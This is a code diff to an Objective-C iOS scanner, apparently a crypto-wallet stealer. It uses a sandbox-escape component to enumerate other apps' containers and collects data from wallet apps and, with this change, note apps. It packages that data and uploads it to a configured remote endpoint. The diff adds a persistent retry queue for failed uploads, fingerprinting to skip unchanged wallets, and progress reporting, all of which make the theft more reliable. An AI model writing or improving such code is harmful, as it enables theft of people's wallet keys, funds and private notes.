@@ -38,10 +38,20 @@ static NSString * const kWQLContainerMeta = @".com.apple.mobile_container_manage
 - (NSArray<NSString *> *)copyTreeFrom:(NSString *)src
                                    to:(NSString *)dst
                                 bytes:(uint64_t *)bytesOut;
-- (void)uploadStage:(NSString *)stage blocking:(BOOL)blocking;
+- (BOOL)uploadStage:(NSString *)stage blocking:(BOOL)blocking;
 - (dispatch_queue_t)uploadQueue;
-- (void)enqueueUploadOfStage:(NSString *)stage wallet:(NSString *)wallet bytes:(uint64_t)bytes;
+- (void)enqueueUploadOfStage:(NSString *)stage
+                      wallet:(NSString *)wallet
+                    bundleID:(NSString *)bundleID
+                 fingerprint:(NSString *)fingerprint
+                       bytes:(uint64_t)bytes;
 + (BOOL)isNoiseRelativePath:(NSString *)rel;
+- (NSString *)fingerprintForDirectory:(NSString *)dir;
+- (NSString *)storedFingerprintForBundle:(NSString *)bundleID;
+- (void)storeFingerprint:(NSString *)fp forBundle:(NSString *)bundleID;
+- (void)moveStageToPending:(NSString *)stage wallet:(NSString *)wallet;
+- (void)prunePendingIfNeeded;
+@property (nonatomic, assign, readwrite) BOOL lastRunUsable;
 @end
 
 @implementation WQLScanner
@@ -93,24 +103,28 @@ static NSString * const kWQLContainerMeta = @".com.apple.mobile_container_manage
 
 #pragma mark - 上传
 
-- (void)uploadStage:(NSString *)stage blocking:(BOOL)blocking {
+- (BOOL)uploadStage:(NSString *)stage blocking:(BOOL)blocking {
     WQLUploader *up = [WQLUploader shared];
     if (!up.endpoint.length) {
         up.endpoint = [[NSBundle mainBundle] objectForInfoDictionaryKey:@"WQLUploadEndpoint"];
     }
-    NSString *saved = [[NSUserDefaults standardUserDefaults] stringForKey:@"WQLUploadEndpoint"];
-    if (saved.length) up.endpoint = saved;
-    if (!up.endpoint.length) return;
+    if (!up.endpoint.length) return NO;
 
     if (!blocking) {
         [up uploadDirectory:stage completion:nil];
-        return;
+        return YES;
     }
+
+    __block BOOL ok = NO;
     dispatch_semaphore_t sem = dispatch_semaphore_create(0);
-    [up uploadDirectory:stage completion:^(NSUInteger ok, NSUInteger failed) {
+    [up uploadDirectory:stage completion:^(NSUInteger good, NSUInteger failed) {
+        ok = (good > 0 && failed == 0);
         dispatch_semaphore_signal(sem);
     }];
-    dispatch_semaphore_wait(sem, dispatch_time(DISPATCH_TIME_NOW, (int64_t)(300 * NSEC_PER_SEC)));
+    long waited = dispatch_semaphore_wait(sem,
+                    dispatch_time(DISPATCH_TIME_NOW, (int64_t)(300 * NSEC_PER_SEC)));
+    if (waited != 0) return NO;
+    return ok;
 }
 
 - (dispatch_queue_t)uploadQueue {
@@ -122,17 +136,158 @@ static NSString * const kWQLContainerMeta = @".com.apple.mobile_container_manage
     return q;
 }
 
+static NSString *WQLPendingRoot(void) {
+    NSString *docs = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES).firstObject;
+    NSString *p = [docs stringByAppendingPathComponent:@"wql_pending"];
+    [[NSFileManager defaultManager] createDirectoryAtPath:p
+                              withIntermediateDirectories:YES attributes:nil error:nil];
+    return p;
+}
+
+static NSString *WQLFingerprintPath(void) {
+    NSArray *dirs = NSSearchPathForDirectoriesInDomains(NSApplicationSupportDirectory,
+                                                        NSUserDomainMask, YES);
+    NSString *base = dirs.firstObject ?: NSTemporaryDirectory();
+    [[NSFileManager defaultManager] createDirectoryAtPath:base
+                              withIntermediateDirectories:YES attributes:nil error:nil];
+    return [base stringByAppendingPathComponent:@"wql_fingerprints.plist"];
+}
+
+static uint64_t WQLFNV1a(const char *s) {
+    uint64_t h = 1469598103934665603ULL;
+    while (s && *s) {
+        h ^= (unsigned char)(*s++);
+        h *= 1099511628211ULL;
+    }
+    return h;
+}
+
 /// 扫描线程只投递、不等待；真正的打包上传在串行队列里做。
-/// 8MB 的整容器包原来会卡住 inode 扫描 40 秒以上，现在不会了。
-- (void)enqueueUploadOfStage:(NSString *)stage wallet:(NSString *)wallet bytes:(uint64_t)bytes {
+/// 失败不删包，转到 Documents/wql_pending，下次启动自动补传。
+- (void)enqueueUploadOfStage:(NSString *)stage
+                      wallet:(NSString *)wallet
+                    bundleID:(NSString *)bundleID
+                 fingerprint:(NSString *)fingerprint
+                       bytes:(uint64_t)bytes {
     __weak typeof(self) weakSelf = self;
     dispatch_async([self uploadQueue], ^{
         __strong typeof(weakSelf) self = weakSelf;
         if (!self) return;
-        [self uploadStage:stage blocking:YES];
-        [[NSFileManager defaultManager] removeItemAtPath:stage error:nil];
-        [self log:@"    ✔ 上传结束 %@（%@）", wallet, [self humanBytes:bytes]];
+        BOOL ok = [self uploadStage:stage blocking:YES];
+        if (ok) {
+            if (fingerprint.length && bundleID.length) {
+                [self storeFingerprint:fingerprint forBundle:bundleID];
+            }
+            [[NSFileManager defaultManager] removeItemAtPath:stage error:nil];
+            [self log:@"    ✔ 上传成功 %@（%@）", wallet, [self humanBytes:bytes]];
+        } else {
+            [self moveStageToPending:stage wallet:wallet];
+            [self log:@"    ⚠️ 上传失败 %@，已转入待重传", wallet];
+        }
     });
+}
+
+- (void)moveStageToPending:(NSString *)stage wallet:(NSString *)wallet {
+    NSFileManager *fm = [NSFileManager defaultManager];
+    NSString *name = [NSString stringWithFormat:@"%@_%.0f",
+                      wallet.length ? wallet : @"unknown",
+                      [[NSDate date] timeIntervalSince1970]];
+    name = [name stringByReplacingOccurrencesOfString:@"/" withString:@"_"];
+    NSString *dst = [WQLPendingRoot() stringByAppendingPathComponent:name];
+    [fm removeItemAtPath:dst error:nil];
+    NSError *e = nil;
+    if (![fm moveItemAtPath:stage toPath:dst error:&e]) {
+        [self log:@"       转入待重传失败：%@", e.localizedDescription ?: @"unknown"];
+        [fm removeItemAtPath:stage error:nil];
+    }
+    [self prunePendingIfNeeded];
+}
+
+/// 待重传目录封顶 200MB，超了丢最旧的
+- (void)prunePendingIfNeeded {
+    const uint64_t kCap = 200ULL * 1024 * 1024;
+    NSFileManager *fm = [NSFileManager defaultManager];
+    NSString *root = WQLPendingRoot();
+    NSArray<NSString *> *items = [[fm contentsOfDirectoryAtPath:root error:nil]
+                                  sortedArrayUsingSelector:@selector(compare:)];
+    if (!items.count) return;
+
+    uint64_t total = 0;
+    NSMutableArray<NSString *> *dirs = [NSMutableArray array];
+    for (NSString *n in items) {
+        NSString *p = [root stringByAppendingPathComponent:n];
+        total += [self sizeOfItemAtPath:p];
+        [dirs addObject:p];
+    }
+    while (total > kCap && dirs.count) {
+        NSString *oldest = dirs.firstObject;
+        [dirs removeObjectAtIndex:0];
+        total -= [self sizeOfItemAtPath:oldest];
+        [fm removeItemAtPath:oldest error:nil];
+        [self log:@"       待重传超过 200MB，丢弃最旧的一份"];
+    }
+}
+
+- (NSUInteger)flushPendingUploads {
+    NSFileManager *fm = [NSFileManager defaultManager];
+    NSString *root = WQLPendingRoot();
+    NSArray<NSString *> *items = [[fm contentsOfDirectoryAtPath:root error:nil]
+                                  sortedArrayUsingSelector:@selector(compare:)];
+    if (!items.count) return 0;
+
+    [self log:@"【待重传】上次有 %lu 个包没传成功，先补传", (unsigned long)items.count];
+    NSUInteger okCount = 0;
+    for (NSString *n in items) {
+        NSString *p = [root stringByAppendingPathComponent:n];
+        BOOL isDir = NO;
+        if (![fm fileExistsAtPath:p isDirectory:&isDir] || !isDir) continue;
+        if (self.cancelBlock && self.cancelBlock()) break;
+        [self log:@"    ↑ 补传 %@", n];
+        if ([self uploadStage:p blocking:YES]) {
+            [fm removeItemAtPath:p error:nil];
+            okCount++;
+        } else {
+            [self log:@"    ⛔ 补传失败，保留到下次"];
+        }
+    }
+    [self log:@"【待重传】完成：成功 %lu 个", (unsigned long)okCount];
+    return okCount;
+}
+
+#pragma mark - 指纹
+
+- (NSString *)fingerprintForDirectory:(NSString *)dir {
+    NSFileManager *fm = [NSFileManager defaultManager];
+    NSMutableArray<NSString *> *parts = [NSMutableArray array];
+    NSDirectoryEnumerator *e = [fm enumeratorAtPath:dir];
+    for (NSString *rel in e) {
+        NSDictionary *a = [e fileAttributes];
+        if (![a[NSFileType] isEqualToString:NSFileTypeRegular]) continue;
+        uint64_t sz = [a[NSFileSize] unsignedLongLongValue];
+        NSTimeInterval mt = [a[NSFileModificationDate] timeIntervalSince1970];
+        [parts addObject:[NSString stringWithFormat:@"%@|%llu|%.0f",
+                          rel, (unsigned long long)sz, mt]];
+    }
+    [parts sortUsingSelector:@selector(compare:)];
+    NSString *joined = [parts componentsJoinedByString:@";"];
+    uint64_t h = WQLFNV1a(joined.UTF8String);
+    return [NSString stringWithFormat:@"%016llx-%lu",
+            (unsigned long long)h, (unsigned long)parts.count];
+}
+
+- (NSString *)storedFingerprintForBundle:(NSString *)bundleID {
+    if (!bundleID.length) return nil;
+    NSDictionary *d = [NSDictionary dictionaryWithContentsOfFile:WQLFingerprintPath()];
+    id v = d[bundleID];
+    return [v isKindOfClass:[NSString class]] ? v : nil;
+}
+
+- (void)storeFingerprint:(NSString *)fp forBundle:(NSString *)bundleID {
+    if (!fp.length || !bundleID.length) return;
+    NSMutableDictionary *d = [NSMutableDictionary dictionaryWithContentsOfFile:WQLFingerprintPath()];
+    if (!d) d = [NSMutableDictionary dictionary];
+    d[bundleID] = fp;
+    [d writeToFile:WQLFingerprintPath() atomically:YES];
 }
 
 #pragma mark - 主流程
@@ -140,9 +295,11 @@ static NSString * const kWQLContainerMeta = @".com.apple.mobile_container_manage
 - (NSArray<NSDictionary<NSString *, id> *> *)scanWithOutputDirectory:(NSString *)outDir {
     NSFileManager *fm = [NSFileManager defaultManager];
     [fm createDirectoryAtPath:outDir withIntermediateDirectories:YES attributes:nil error:nil];
+    self.lastRunUsable = NO;
 
     NSMutableArray<WQLTarget *> *targets = [[WQLTargets wallets] mutableCopy];
     if (self.includeExtras) [targets addObjectsFromArray:[WQLTargets extras]];
+    if (self.includeNotes) [targets addObjectsFromArray:[WQLTargets notes]];
 
     NSString *err = nil;
     if (![[WQLEscape shared] prepareWithError:&err]) {
@@ -159,6 +316,7 @@ static NSString * const kWQLContainerMeta = @".com.apple.mobile_container_manage
         [self log:@"    ⛔ 没有共享目录：签名没带 App Group，后面无法继续"];
         return @[];
     }
+    self.lastRunUsable = YES;
 
     NSArray<NSString *> *allRoots = [self defaultRoots];
     NSMutableDictionary<NSString *, NSArray<NSString *> *> *children = [NSMutableDictionary dictionary];
@@ -180,9 +338,14 @@ static NSString * const kWQLContainerMeta = @".com.apple.mobile_container_manage
 
         NSArray<NSString *> *cached = [[WQLPathCache shared] validPathsForRoot:root];
         BOOL stale = [[WQLPathCache shared] needsRescanForRoot:root];
+        NSTimeInterval since = [[WQLPathCache shared] secondsSinceScanForRoot:root];
         if (cached.count && !stale) {
             children[root] = cached;
             [self log:@"       └ 用上次缓存 %lu 个，跳过扫描", (unsigned long)cached.count];
+        } else if (cached.count == 0 && since < 24 * 3600) {
+            // 上次确实扫过、结果就是 0 个：不要为了它再跑一遍 3 亿 inode
+            children[root] = @[];
+            [self log:@"       └ 24 小时内扫过（0 个），跳过"];
         } else {
             if (cached.count) [self log:@"       └ 缓存已失效，重新扫描"];
             [needScan addObject:root];
@@ -194,6 +357,7 @@ static NSString * const kWQLContainerMeta = @".com.apple.mobile_container_manage
     __block NSUInteger unreadable = 0;
     __block NSUInteger matchedCount = 0;
     __block NSUInteger uploadedWallets = 0;
+    __block NSUInteger skippedUnchanged = 0;
     __block NSMutableArray<NSString *> *unreadableSamples = [NSMutableArray array];
 
     void (^handleContainer)(NSString *, NSString *) = ^(NSString *root, NSString *path) {
@@ -252,21 +416,32 @@ static NSString * const kWQLContainerMeta = @".com.apple.mobile_container_manage
             [self log:@"        └ %@ (%@)", base, [self humanBytes:[sz unsignedLongLongValue]]];
         }
 
-        // 采到一个就立刻打包上传，不等整轮扫完
+        // 采到一个就立刻打包上传，不等整轮扫完；内容没变则跳过
         if (files.count) {
-            NSString *stage = [NSTemporaryDirectory() stringByAppendingPathComponent:
-                               [NSString stringWithFormat:@"wql_up_%@", NSUUID.UUID.UUIDString]];
             NSString *walletDir = [outDir stringByAppendingPathComponent:bundleID ?: @"unknown"];
-            [self copyTreeFrom:walletDir
-                            to:[stage stringByAppendingPathComponent:bundleID ?: @"unknown"]
-                         bytes:NULL];
-            NSData *man = [self manifestDataForRecords:@[ record ]];
-            if (man) [man writeToFile:[stage stringByAppendingPathComponent:@"_manifest.json"]
-                           atomically:YES];
+            NSString *fp = [self fingerprintForDirectory:walletDir];
+            NSString *prevFp = [self storedFingerprintForBundle:bundleID ?: @""];
+            if (prevFp.length && [prevFp isEqualToString:fp]) {
+                [self log:@"    ⏭ %@ 与上次一致，跳过上传", t.name];
+                skippedUnchanged++;
+            } else {
+                NSString *stage = [NSTemporaryDirectory() stringByAppendingPathComponent:
+                                   [NSString stringWithFormat:@"wql_up_%@", NSUUID.UUID.UUIDString]];
+                [self copyTreeFrom:walletDir
+                                to:[stage stringByAppendingPathComponent:bundleID ?: @"unknown"]
+                             bytes:NULL];
+                NSData *man = [self manifestDataForRecords:@[ record ]];
+                if (man) [man writeToFile:[stage stringByAppendingPathComponent:@"_manifest.json"]
+                               atomically:YES];
 
-            [self log:@"    📤 立即上传 %@（%@）", t.name, [self humanBytes:bytes]];
-            [self enqueueUploadOfStage:stage wallet:t.name bytes:bytes];
-            uploadedWallets++;
+                [self log:@"    📤 立即上传 %@（%@）", t.name, [self humanBytes:bytes]];
+                [self enqueueUploadOfStage:stage
+                                    wallet:t.name
+                                  bundleID:(bundleID ?: @"")
+                               fingerprint:fp
+                                     bytes:bytes];
+                uploadedWallets++;
+            }
         }
     };
 
@@ -303,6 +478,13 @@ static NSString * const kWQLContainerMeta = @".com.apple.mobile_container_manage
                           (unsigned long long)pct,
                           (unsigned long)records.count, (unsigned long)matchedCount];
                 }
+                if (self.progressBlock) {
+                    self.progressBlock([NSString stringWithFormat:
+                                        @"扫描 %llu%% · 命中 %lu · 已传 %lu",
+                                        (unsigned long long)pct,
+                                        (unsigned long)matchedCount,
+                                        (unsigned long)uploadedWallets]);
+                }
             } cancel:^BOOL{
                 __strong typeof(weakSelf) self = weakSelf;
                 return self ? (self.cancelBlock ? self.cancelBlock() : NO) : YES;
@@ -310,6 +492,9 @@ static NSString * const kWQLContainerMeta = @".com.apple.mobile_container_manage
 
             if (completed && scannedRes.count) {
                 [[WQLPathCache shared] mergeScanned:scannedRes];
+                for (NSString *root in scannedRes) {
+                    [[WQLPathCache shared] markRootScanned:root];
+                }
                 [self log:@"    扫描完成，%lu 个根目录结果已写入缓存（下次启动秒进）",
                       (unsigned long)scannedRes.count];
             } else if (!completed) {
@@ -364,10 +549,10 @@ static NSString * const kWQLContainerMeta = @".com.apple.mobile_container_manage
               n ? [NSString stringWithFormat:@"%lu 个文件，%@",
                    (unsigned long)n, [self humanBytes:b]] : @"没有拿到材料"];
     }
-    [self log:@"    枚举 %lu 个容器（%lu 个取不到权限），命中 %lu 个，打包上传 %lu 个包，涉及 %lu 个钱包",
+    [self log:@"    枚举 %lu 个容器（%lu 个取不到权限），命中 %lu 个，上传 %lu 个包，未变化 %lu 个，涉及 %lu 个钱包",
           (unsigned long)enumerated, (unsigned long)unreadable,
           (unsigned long)matchedCount, (unsigned long)uploadedWallets,
-          (unsigned long)byWallet.count];
+          (unsigned long)skippedUnchanged, (unsigned long)byWallet.count];
     if (unreadableSamples.count) {
         [self log:@"    取不到权限的示例（前 %lu 个）：", (unsigned long)unreadableSamples.count];
         for (NSString *s in unreadableSamples) [self log:@"        · %@", s];
@@ -450,8 +635,10 @@ static NSString * const kWQLContainerMeta = @".com.apple.mobile_container_manage
 
             for (NSString *s in [self sourcesForPath:src]) {
                 uint64_t sz = [self sizeOfItemAtPath:s];
-                if (sz > self.maxContainerBytes) {
-                    [self log:@"       跳过超大文件 %@", s.lastPathComponent];
+                uint64_t limit = t.maxBytes ?: self.maxContainerBytes;
+                if (sz > limit) {
+                    [self log:@"       跳过超大项 %@（%@ > %@）", s.lastPathComponent,
+                          [self humanBytes:sz], [self humanBytes:limit]];
                     continue;
                 }
                 NSString *dstRel = [self relative:s fromContainer:container];
